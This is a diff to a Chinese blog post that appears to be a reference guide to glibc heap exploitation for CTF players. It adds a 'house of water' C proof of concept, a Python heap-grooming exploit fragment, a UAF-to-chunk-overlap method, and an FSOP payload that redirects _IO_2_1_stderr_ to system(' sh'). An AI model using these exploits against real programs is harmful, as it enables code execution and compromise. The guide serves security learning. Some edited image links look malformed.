@@ -6,6 +6,7 @@ date: 2024-07-01 12:00:00
 ---
 无图无真相
 <!-- more -->
+
 [toc]
 
 `glibc`的利用方式种类繁多，不同版本之间亦存在很大差别，这对一些尤其是刚刚入门的师傅带来了一些困难。本文以图解的方式来提供一种模块化的`glibc`利用方式供师傅们查询，每一种攻击方法都将会分为适用版本、利用方式、实现效果、常用触发方式、图解、学习文章、不同版本差异几个部分。
@@ -40,7 +41,7 @@ date: 2024-07-01 12:00:00
 
 ### 图解
 
-![unlink_2.27](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/unlink_2.27.png)
+![unlink_2.27](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/imagesunlink_2.27.png)
 
 ### POC
 
@@ -83,7 +84,7 @@ int main(){
 
 基本没区别，只需要在`chunk1`中额外写下`fake prevsize`和`fake size`，如下图
 
-![unlink_2.38](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202402211057705.png)
+![unlink_2.38](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/imagesunlink_2.38.png)
 
 由于`chunk1`内容一般可控，因此不需要额外漏洞
 
@@ -820,6 +821,155 @@ int main(){
 
 施工中
 
+# house of water
+
+## 适用版本
+
+全版本，测试中`(<=glibc2.39)`
+
+## 利用方式
+
+- 释放一个`0x3e0`和`0x3f0`的`chunk`到`tcache`，在`tcache_perthread_struct->count`中组成`fake_chunk`的`size`。
+- 计算偏移`0x10001`时，构造刚刚的`fake_chunk`的`next chunk`的`prev_size`和`size`。
+- 构造三个`unsortedbin chunk`，并释放到`unsortedbin`。接下来要让三个`chunk`中间的变为`fake_chunk`。
+- 通过漏洞（例如任意地址`free`释放到`tcache->entries`，或者`UAF`），构造`fake_chunk->fd`和`fake_chunk->bk`为`unsortedbin`中的第三个和第一个`chunk`。
+- 通过漏洞（例如`UAF`），构造`unsortedbin`的`fd`和`bk`链，使得三个`unsortedbin chunk`中的第二个为`fake chunk`。
+- 完成上述操作后，`fake chunk`被挂入`unsortedbin`。申请一个`unsortedbin chunk`即可让`libc`地址挂入`tcache`，接下来可以实现`IO_FILE leak`等操作。
+
+## 实现效果
+
+无`leak`利用
+
+## 常用触发方式
+
+`UAF`
+
+## POC
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+void init()
+{
+    setbuf(stdin, NULL);
+    setbuf(stdout, NULL);
+    setbuf(stderr, NULL);
+}
+
+int main()
+{
+    init();
+
+    /* 第一步，释放0x3e0和0x3f0的chunk，在tcache上打一个fake chunk的size出来0x10001 */
+    size_t *temp1 = malloc(0x3d0);
+    size_t *temp2 = malloc(0x3e0);
+
+    free(temp1);
+    free(temp2);
+
+    size_t heap_base = (size_t)temp1 - 0x2a0;
+
+    /* 第二步，申请好所有堆块 */
+
+    // 申请7个tcache的chunk
+    size_t *tcache_chunks[7];
+    for (int i = 0; i < 7; i++)
+    {
+        tcache_chunks[i] = (size_t *)malloc(0xf0);
+    }
+
+    // 申请三个unsortedbin的chunk，要隔开
+    size_t *unsorted_chunk[3];
+    size_t *gap[3];
+
+    for (int i = 0; i < 3; i++)
+    {
+        unsorted_chunk[i] = (size_t *)malloc(0xf0);
+        gap[i] = (size_t *)malloc(0x20);
+    }
+
+    // 写fake chunk (0x10001那个chunk)的下一个chunk的prev_size和size
+    size_t *big_gap = (size_t *)malloc(0xeb70);
+    size_t *secure = (size_t *)malloc(0x20);
+    secure[0] = 0x10000;
+    secure[1] = 0x20;
+
+    /* 第三步，构造unsortedbin链 */
+
+    // 先填满tcache
+    for (int i = 0; i < 7; i++)
+    {
+        free(tcache_chunks[i]);
+    }
+
+    // 构造好unsortedbin链
+    for (int i = 0; i < 3; i++)
+    {
+        free(unsorted_chunk[i]);
+    }
+
+    /* 第四步，通过漏洞让fake chunk的fd和bk满足条件 */
+    // 这里需要根据题目漏洞。我们这里随便使用任意地址free来完成这个条件
+    *(size_t *)((size_t)unsorted_chunk[0] - 0x18) = 0x21;
+    free((size_t *)((size_t)unsorted_chunk[0] - 0x10));
+    *(size_t *)((size_t)unsorted_chunk[0] - 0x8) = 0x101;
+
+    *(size_t *)((size_t)unsorted_chunk[2] - 0x18) = 0x31;
+    free((size_t *)((size_t)unsorted_chunk[2] - 0x10));
+    *(size_t *)((size_t)unsorted_chunk[2] - 0x8) = 0x101;
+
+    /* 第五步， 编辑unsortedbin的第一个chunk的fd和第三个chunk的bk，让fake chunk在他们中间 */
+    unsorted_chunk[2][0] = heap_base + 0x80;
+    unsorted_chunk[0][1] = heap_base + 0x80;
+
+    /* 第六步，申请chunk即可让libc地址挂入tcache~ */
+    malloc(0x2e0);
+
+    puts("done!");
+}
+```
+
+## 图解
+
+![house_of_water](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/imageshouse_of_water.png)
+
+## house of water堆风水
+
+实际操作中，若不含有`edit`功能，可能难以布置堆风水。这里可以参照本页面的`UAF`构建堆块重叠部分。
+
+我们可以通过不断重分配堆块，让欲编辑的堆块上方的指针也可控。
+
+一个使用过的`exp`如下所示：
+
+```python
+add(size=0x4f0, content=b'a') # 9, c160 & c170
+add(size=0x4f0, content=b'a') # 10 c660 & c670
+
+delete(9)
+delete(10)
+
+add(size=0x4e0, content=b'a') # 11 c160 & c170
+add(size=0x500, content=b'a') # 12 c650 & c660
+
+delete(11)
+delete(12)
+
+add(size=0x4d0, content=b'a') # 13 c160 & c170
+add(size=0x510, content=b'a') # 14 c640 & c650
+add(size=0xf0, content=b'gap') # 15
+
+delete(14)
+add(0x20, content=p64(0)+p64(0x51)+p64(0)+p64(0x21)) # 16，用于在其中编辑一个fake chunk
+add(0xf0, content=b'a') # 17，要控制的堆块
+add(0x300, content=b'a') # 18，剩下的部分，申请回来防止干扰
+add(0xd0, content=b'a') # 19，同样为剩下的部分，分两次申请回来而已
+```
+
+
+
+
+
 # house of spirit
 
 施工中
@@ -1200,6 +1350,35 @@ pwndbg> disassemble svcudp_reply
 ```
 
 如上所示，若能控制`rdi`，那么可以通过`rdi`来控制`rbx`以及`rax`，且执行函数可控，那么设置执行的函数为`leave; ret`即可进行栈迁移。
+
+# UAF转堆块重叠 & house of water堆风水
+
+有的题目中，我们只有`UAF`漏洞，但不含有编辑功能，此时将`UAF`转换为堆块重叠就很有必要。这里我们总结一下将`UAF`转堆块重叠的方法。
+
+当题目不存在`UAF`时，唯一的编辑堆块方法就是在`add`的时候进行编辑，这意味着我们需要通过释放再申请回来这种方式来进行编辑某个堆块。同时，这也表明我们不能让两个堆块起始指针相同。
+
+我们可以采用如下方式：（注意以下都不是`tcache`或者`fastbin`的堆块）
+
+- 申请`size`大小的堆块`A`，和`size`大小的堆块`B`。注意不需要分隔。
+- 释放`A`和`B`，此时`A`和`B`将进行合并。
+- 申请`size-0x10`大小的堆块`A`，和`size+0x10`大小的堆块`B`。
+- 释放`A`和`B`，此时`A`和`B`将进行合并。
+
+- 申请`size-0x20`大小的堆块`A`，和`size+0x20`大小的堆块`B`。
+
+- 释放`B`。从`B`中申请一个大小为`0x30`的堆块（`malloc(0x20)`），可以在其中构造一个`fake`堆块。由于我们在上面已经获得了该堆块的指针，因此可以直接释放该`fake`堆块，从而让`fake`堆块能够编辑`B`堆块中剩下的所有部分。
+
+- 这里最好让`fake chunk`属于`tcache`大小，这用到了`tcache`的一个特性：类似于`house of force`，释放一个大小属于`tcache`的`chunk`时，实际上没有任何安全检查，只会检查`size`来将其放到对应的`tcache bins`中去。
+
+## 图解
+
+![chunks_overlap](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/imageschunks_overlap.png)
+
+如上图所示，前三个状态是一直重新对`A`和`B`进行重分配。只会进行两次，到状态三就不再发生重分配。
+
+在状态三时，释放`B`（也就是实线以下的部分）。从`B`中申请出`C`和`D`两个`chunk`。其中，`chunk C`中我们布置一个`fake chunk`，其大小大于`D`。`D`是我们希望重叠控制的部分。
+
+如此一来，我们便可以使用`C`中的`fake chunk`来编辑`D`：我们可以一直释放`fake chunk`，再申请回来。如此不会影响到其它堆块，从而在不含有`edit`功能的`UAF`中，实际上完成了`edit`这样的利用方式。
 
 # house of kiwi
 
@@ -2318,6 +2497,20 @@ edit(index=3, size=0xf0, content=chunk_A)
 
 chunk_B = p64(0).ljust(0x68, b'\x00') + p64(libc.sym['system'])
 edit(index=4, size=0xf0, content=chunk_B)
+```
+
+在一个`chunk`上完成所有操作的实例`exp`如下：
+
+```python
+self_chunk = libc.sym['_IO_2_1_stderr_']
+func = libc.sym['system']
+payload = b'  sh'
+payload = payload.ljust(0x20, b'\x00') + p64(0) + p64(1)
+payload = payload.ljust(0x68, b'\x00') + p64(func)
+payload = payload.ljust(0x88, b'\x00') + p64(libc.sym['_environ']-0x10)
+payload = payload.ljust(0xa0, b'\x00') + p64(self_chunk)
+payload = payload.ljust(0xd8, b'\x00') + p64(libc.sym['_IO_wfile_jumps'])
+payload = payload.ljust(0xe0, b'\x00') + p64(self_chunk)
 ```
 
 # house of apple2 (_IO_wfile_underflow_mmap)
